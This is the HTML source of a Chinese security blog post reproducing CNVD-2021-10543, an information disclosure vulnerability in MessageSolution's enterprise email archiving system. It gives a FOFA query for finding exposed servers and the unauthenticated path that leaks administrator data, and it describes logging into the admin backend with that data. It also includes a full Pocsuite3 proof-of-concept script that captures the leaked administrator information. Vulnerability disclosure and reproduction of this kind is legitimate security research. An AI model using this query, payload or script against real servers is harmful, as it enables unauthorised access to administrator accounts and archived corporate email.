@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞 | Wisejay | To be better</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="漏洞复现">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Wisejay</h5>
+          <a href="mailto:1418084893@qq.com" title="1418084893@qq.com" class="mail">
+            
+              <span>1</span>
+            
+              <span>4</span>
+            
+              <span>1</span>
+            
+              <span>8</span>
+            
+              <span>0</span>
+            
+              <span>8</span>
+            
+              <span>4</span>
+            
+              <span>8</span>
+            
+              <span>9</span>
+            
+              <span>3</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                首页
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                分类
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                关于
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-03-22T08:47:03.270Z" itemprop="datePublished" class="page-time">
+  2021-03-22
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/漏洞复现/">漏洞复现</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-CNVD-2021-10543"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-03-22 16:47:03" datetime="2021-03-22T08:47:03.270Z"  itemprop="datePublished">2021-03-22</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/漏洞复现/">漏洞复现</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h1 id="MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞"><a href="#MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞" class="headerlink" title="MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞"></a>MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞。攻击者可利用漏洞获取敏感信息。</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>MessageSolution 企业邮件归档管理系统EEA</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>FOFA:<code>title=&quot;MessageSolution Enterprise Email Archiving (EEA)&quot;</code></p>
+<p>登录界面</p>
+<figure class="image-box">
+                <a rel=MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞 href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210322154203607.png" title="image-20210322154203607" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210322154203607.png" alt="image-20210322154203607" title class></a>
+                <p>image-20210322154203607</p>
+            </figure>
+
+<p>Payload:<code>x.x.x.x/authenticationserverservlet</code></p>
+<p>获取泄露信息</p>
+<figure class="image-box">
+                <a rel=MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞 href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210322154336870.png" title="image-20210322154336870" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210322154336870.png" alt="image-20210322154336870" title class></a>
+                <p>image-20210322154336870</p>
+            </figure>
+
+<p>根据泄露的信息登录后台</p>
+<figure class="image-box">
+                <a rel=MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞 href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210322154503394.png" title="image-20210322154503394" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210322154503394.png" alt="image-20210322154503394" title class></a>
+                <p>image-20210322154503394</p>
+            </figure>
+
+<h2 id="Pocsuite3脚本"><a href="#Pocsuite3脚本" class="headerlink" title="Pocsuite3脚本"></a>Pocsuite3脚本</h2><p>测试</p>
+<figure class="image-box">
+                <a rel=MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞 href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210322154725678.png" title="image-20210322154725678" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210322154725678.png" alt="image-20210322154725678" title class></a>
+                <p>image-20210322154725678</p>
+            </figure>
+
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> Output, POCBase,requests,register_poc</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestPOC</span><span class="params">(POCBase)</span>:</span></span><br><span class="line">    vulID = <span class="string">''''''</span></span><br><span class="line">    cveID = <span class="string">''''''</span></span><br><span class="line">    cnvdID = <span class="string">'''2021-10543'''</span></span><br><span class="line">    cnnvdID = <span class="string">''''''</span></span><br><span class="line">    version = <span class="string">'''1.0'''</span></span><br><span class="line">    author = <span class="string">''''''</span></span><br><span class="line">    vulDate = <span class="string">'''2021-03-7'''</span></span><br><span class="line">    createDate = <span class="string">'''2021-03-22'''</span></span><br><span class="line">    updateDate = <span class="string">'''2021-03-22'''</span></span><br><span class="line">    name = <span class="string">'''MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞 '''</span></span><br><span class="line">    desc = <span class="string">'''MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞 '''</span></span><br><span class="line">    solution = <span class="string">'''&lt;p&gt;升级致最新版本。&lt;/p&gt;'''</span></span><br><span class="line">    severity = <span class="string">'''middle'''</span></span><br><span class="line">    vulType = <span class="string">'''Information Disclosure'''</span></span><br><span class="line">    taskType = <span class="string">'''app-vul'''</span></span><br><span class="line">    references = [<span class="string">''''''</span>]</span><br><span class="line">    appName = <span class="string">'''MessageSolution'''</span></span><br><span class="line">    appVersion = <span class="string">'''MessageSolution'''</span></span><br><span class="line">    appPowerLink = <span class="string">''''''</span></span><br><span class="line">    samples = [<span class="string">''''''</span>]</span><br><span class="line">    install_requires = [<span class="string">''''''</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_attack</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._verify()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        vuln_url = url+ <span class="string">"authenticationserverservlet"</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = requests.request(<span class="string">'GET'</span>,url=vuln_url,timeout=<span class="number">5</span>,verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"administrator"</span> <span class="keyword">in</span> resp.text <span class="keyword">and</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">                result[<span class="string">'AdminInfo'</span>] = resp.text</span><br><span class="line">                <span class="keyword">return</span> self.parse_output(result)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(resp)</span><br><span class="line">                <span class="keyword">return</span> self.parse_output(result)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> self.parse_output(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_output</span><span class="params">(self, result)</span>:</span></span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">            result = <span class="string">'Failed'</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> isinstance(result, dict):</span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(result)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">register_poc(TestPOC)</span><br></pre></td></tr></table></figure>
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2021-03-22T08:47:26.120Z" itemprop="dateUpdated">2021-03-22 16:47:26</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2021/03/22/CNVD-2021-10543/" target="_blank" rel="external">http://wisejay.xyz/2021/03/22/CNVD-2021-10543/</a>
+        
+    </div>
+    <footer>
+        <a href="http://wisejay.xyz">
+            <img src="/img/avatar.jpg" alt="Wisejay">
+            Wisejay
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.xyz/2021/03/22/CNVD-2021-10543/&title=《MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞》 — Wisejay&pic=http://wisejay.xyz/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.xyz/2021/03/22/CNVD-2021-10543/&title=《MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞》 — Wisejay&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2021/03/22/CVE-2021-22986/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">F5 BIG-IP 远程代码执行漏洞</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞"><span class="post-toc-number">1.</span> <span class="post-toc-text">MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞描述"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">漏洞描述</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞影响"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">漏洞影响</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞复现"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">漏洞复现</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Pocsuite3脚本"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">Pocsuite3脚本</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Wisejay &copy; 2019 - 2021
+            </span>
+        		
+           	
+            
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.xyz/2021/03/22/CNVD-2021-10543/&title=《MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞》 — Wisejay&pic=http://wisejay.xyz/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.xyz/2021/03/22/CNVD-2021-10543/&title=《MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞》 — Wisejay&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLUlEQVR42u3ay07DMBAFUP7/p4vECgRt7x0HRO3jVaQ2iU8Wo3n47S1et4/1+freSu76/uu9/1y8MDAwXpaRbKvdaLLp/K7kk2FgYJzAyINsApvxWjwGBgbGLFw+fnK7RQwMDIyVx+Xh+HFRuk7FwMA4h9GWoLdgtZ2xldYeBgbG3ozZYOBvrn99voGBgfHvGbdyzQrOx8niLJR/eQ4GBsbWjPYFeQmaF65tqldkuBgYGFswZiEyb6itHB0rPigGBsYxjKTttRI628NneTMOAwPjHEaCmbXkcnxOepIaYmBgbMTIK9227GwTx7ZsxsDAOI2RH/9qG/frSWdSQmNgYOzNWAe0v7bhOLrGwMA4gJEnefngsx1MrpwBw8DA2Jsxe0Q+nlwpktvpJAYGxq6MdnyYNMvadHOWPj6pwjEwMLZjrIwe8zRxfcBQFLEYGBibMopJwkNenji2Q9AnZ0YwMDA2ZbQvzgeQ+YaKkyBJuw0DA+MARvvi2YdYCdZPPiIGBsZ2jFmLrS042yK5bfBhYGBg5NSVoxt50lnU4hgYGFswktQwGUbWTbEylF9QxGJgYLws41aulfCaV9V52VzMEDAwMF6Wka+VZLE95tUGegwMjBMYs1K23WibhtZHNDAwMA5g5M2vPGW8io2BgYGRM/LwNxtktidEfkgNMTAwMMqW2Ww82Y4HMDAwzmHMitikEJ0F2TqhxMDA2JoxGwzMpg1XDQaG40wMDIzXY7wDZZJlq070M7EAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.2"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.2"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/haruto.model.json"},"display":{"position":"right","width":212,"height":472},"mobile":{"show":true},"log":false});</script></body>
+</html>
